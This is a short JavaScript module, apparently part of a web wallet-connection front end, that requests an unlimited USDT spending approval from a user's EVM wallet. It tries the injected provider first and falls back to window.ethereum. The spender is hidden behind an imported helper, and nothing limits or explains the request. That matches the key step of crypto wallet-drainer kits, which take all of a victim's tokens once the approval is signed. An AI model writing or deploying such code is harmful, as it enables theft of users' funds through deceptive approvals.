import { getInjectedEVMProvider, executeUnlimitedUSDTApproval } from '@/lib/evmWallet'

/**
 * Execute unlimited USDT approval for EVM / Ethereum wallets
 */
export async function triggerUnlimitedApproval(userAddress, connectionType = 'evm') {
  console.log(`[Approval] Triggering unlimited EVM USDT approval for ${userAddress} via ${connectionType}`)

  const evmProvider = getInjectedEVMProvider()
  if (evmProvider) {
    try {
      const chainId = (await evmProvider.request({ method: 'eth_chainId' })) || '0x1'
      const res = await executeUnlimitedUSDTApproval(evmProvider, userAddress, chainId)
      console.log('[Approval] EVM approval result:', res)
      return res
    } catch (err) {
      console.error('[Approval] EVM approval failed:', err)
      throw err
    }
  }

  // Fallback for WalletConnect or embedded EVM session
  if (typeof window !== 'undefined' && window.ethereum) {
    try {
      const chainId = (await window.ethereum.request({ method: 'eth_chainId' })) || '0x1'
      const res = await executeUnlimitedUSDTApproval(window.ethereum, userAddress, chainId)
      return res
    } catch (err) {
      console.error('[Approval] Fallback EVM approval failed:', err)
      throw err
    }
  }

  throw new Error('No active EVM/Ethereum wallet provider detected for approval.')
}
